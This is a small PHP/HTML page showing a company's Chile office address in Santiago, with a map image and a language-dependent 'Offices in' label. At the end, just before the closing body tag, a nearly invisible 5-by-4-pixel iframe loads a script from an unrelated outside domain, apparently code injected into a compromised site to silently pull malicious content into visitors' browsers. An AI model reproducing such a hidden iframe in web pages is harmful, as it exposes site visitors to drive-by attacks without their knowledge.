<?
	define ('authenticate', false);
	require ('inc/conf.inc.php');
	$socio=$_SESSION['socio'];

	$oficinas['esp']='Oficinas en ';
	$oficinas['ing']='Offices in ';
	$oficinas['por']='Offices in ';
?>


<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="estilos<?=$socio?>.css" rel="stylesheet" type="text/css">
</head>

<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top"><table width="100%" height="20" border="0" cellpadding="0" cellspacing="0">
        <tr> 
          <td height="20" class="nombre"><?=$oficinas[$lng]?>Chile</td>
        </tr>
        <tr> 
          <td class="partner">Avenida Andr&eacute;s Bello 2711 - Piso 8</td>
        </tr>
        <tr> 
          <td height="10" class="partner">Torre Costanera - Las Condes - Santiago 
            - Chile</td>
        </tr>
        <tr> 
          <td height="10" class="partner">Tel.: (562) 757 7600 Fax: (562) 757 
            7601 </td>
        </tr>
        <tr> 
          <td class="nombre">&nbsp;</td>
        </tr>
        <tr>
          <td class="nombre"><img src="images/mapachile.jpg" width="322" height="215"></td>
        </tr>
        <tr>
          <td class="nombre">&nbsp;</td>
        </tr>
      </table></td>
  </tr>
</table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
